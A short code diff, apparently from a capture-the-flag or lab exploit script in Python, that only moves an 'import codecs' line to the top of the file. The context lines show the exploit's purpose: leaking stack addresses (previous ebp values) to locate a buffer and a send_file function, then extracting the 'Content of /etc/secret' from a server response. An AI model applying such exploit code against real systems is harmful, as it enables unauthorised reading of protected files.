@@ -8,7 +8,7 @@ from requests import Request, Session
 import base64
 import time
 import requests
-
+import codecs
 
 addr_last = None		# Previous value of ebp. Used to find the address of the buffer, with offset. 
 addr_semi_last = None	# Used in order to find the address of the send_file function, with offset 
@@ -99,7 +99,7 @@ response = s.send(prepped)
 
 content = str(response.content)[84:-1] #Content of /etc/secret
 
-import codecs
+
 hex_string = content
 
 # Convert hex escape sequences to binary
